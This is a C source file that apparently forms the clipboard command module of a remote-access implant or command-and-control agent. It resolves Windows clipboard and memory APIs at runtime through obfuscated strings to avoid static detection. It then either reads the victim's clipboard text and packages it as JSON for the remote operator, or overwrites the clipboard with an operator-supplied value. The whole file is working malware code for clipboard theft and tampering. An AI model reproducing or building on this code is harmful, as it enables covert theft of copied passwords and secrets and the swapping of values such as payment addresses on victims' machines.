#include "config.h"
#ifdef INCLUDE_CMD_CLIPBOARD

#include "commands.h"
#include "json_out.h"

VOID cmd_clipboard(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    // check for set operation
    DWORD val_len = 0;
    char* set_val = parser_string(args, &val_len);

    xstr(_user, "user32.dll");
    HMODULE h_user = inst->Win32.LoadLibraryA(_user);
    if (!h_user) {
        package_add_string(inst, response, XSTR("user32 load failed"));
        response->is_error = TRUE;
        return;
    }
    typedef BOOL (WINAPI *fn_OpenClipboard_t)(void*);
    typedef BOOL (WINAPI *fn_CloseClipboard_t)(void);
    typedef void* (WINAPI *fn_GetClipboardData_t)(UINT);
    typedef void* (WINAPI *fn_SetClipboardData_t)(UINT, HANDLE);
    typedef BOOL (WINAPI *fn_EmptyClipboard_t)(void);
    fn_OpenClipboard_t pOpen = (fn_OpenClipboard_t)(void*)inst->Win32.GetProcAddress(h_user, "OpenClipboard");
    fn_CloseClipboard_t pClose = (fn_CloseClipboard_t)(void*)inst->Win32.GetProcAddress(h_user, "CloseClipboard");
    fn_GetClipboardData_t pGet = (fn_GetClipboardData_t)(void*)inst->Win32.GetProcAddress(h_user, "GetClipboardData");
    fn_SetClipboardData_t pSet = (fn_SetClipboardData_t)(void*)inst->Win32.GetProcAddress(h_user, "SetClipboardData");
    fn_EmptyClipboard_t pEmpty = (fn_EmptyClipboard_t)(void*)inst->Win32.GetProcAddress(h_user, "EmptyClipboard");
    if (!pOpen || !pClose || !pGet) {
        package_add_string(inst, response, XSTR("clipboard resolve failed"));
        response->is_error = TRUE;
        return;
    }

    JSON_BUF jb;
    j_init(&jb);

    if (set_val && val_len > 0) {
        // set operation
        if (!pOpen(NULL)) {
            package_add_string(inst, response, XSTR("OpenClipboard failed"));
            response->is_error = TRUE;
            return;
        }
        pEmpty();
        // use GlobalAlloc via kernel32
        xstr(_k32, "kernel32.dll");
        HMODULE h_k32 = inst->Win32.LoadLibraryA(_k32);
        typedef HANDLE (WINAPI *fn_GlobalAlloc_t)(UINT, SIZE_T);
        fn_GlobalAlloc_t pAlloc = h_k32 ? (fn_GlobalAlloc_t)(void*)inst->Win32.GetProcAddress(h_k32, "GlobalAlloc") : NULL;
        typedef LPVOID (WINAPI *fn_GlobalLock_t)(HANDLE);
        fn_GlobalLock_t pLock = h_k32 ? (fn_GlobalLock_t)(void*)inst->Win32.GetProcAddress(h_k32, "GlobalLock") : NULL;
        typedef HANDLE (WINAPI *fn_GlobalUnlock_t)(HANDLE);
        fn_GlobalUnlock_t pUnlock = h_k32 ? (fn_GlobalUnlock_t)(void*)inst->Win32.GetProcAddress(h_k32, "GlobalUnlock") : NULL;
        BOOL ok = FALSE;
        if (pAlloc && pLock && pUnlock) {
            HANDLE hData = pAlloc(0x0002 /*GMEM_MOVEABLE*/, val_len + 1);
            if (hData) {
                char* p = (char*)pLock(hData);
                if (p) {
                    for (DWORD i = 0; i < val_len; i++) p[i] = set_val[i];
                    p[val_len] = 0;
                    pUnlock(hData);
                    if (pSet) ok = pSet(1 /*CF_TEXT*/, hData) != NULL;
                }
            }
        }
        pClose();
        j_append_raw(&jb, "{\"operation\":\"set\",\"result\":");
        j_append_bool(&jb, ok);
        j_append_raw(&jb, "}");
    } else {
        // get operation
        if (!pOpen(NULL)) {
            package_add_string(inst, response, XSTR("OpenClipboard failed"));
            response->is_error = TRUE;
            return;
        }
        void* hData = pGet(1 /*CF_TEXT*/);
        if (hData) {
            xstr(_k32, "kernel32.dll");
            HMODULE h_k32 = inst->Win32.LoadLibraryA(_k32);
            typedef LPVOID (WINAPI *fn_GlobalLock_t)(HANDLE);
            typedef BOOL (WINAPI *fn_GlobalUnlock_t)(HANDLE);
            fn_GlobalLock_t pLock = h_k32 ? (fn_GlobalLock_t)(void*)inst->Win32.GetProcAddress(h_k32, "GlobalLock") : NULL;
            fn_GlobalUnlock_t pUnlock = h_k32 ? (fn_GlobalUnlock_t)(void*)inst->Win32.GetProcAddress(h_k32, "GlobalUnlock") : NULL;
            if (pLock) {
                char* text = (char*)pLock(hData);
                j_append_raw(&jb, "{\"operation\":\"get\",\"data\":");
                j_append_str(&jb, text ? text : "");
                j_append_raw(&jb, "}");
                pUnlock(hData);
            } else {
                j_append_raw(&jb, "{\"operation\":\"get\",\"error\":\"lock failed\"}");
            }
        } else {
            j_append_raw(&jb, "{\"operation\":\"get\",\"data\":null}");
        }
        pClose();
    }
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
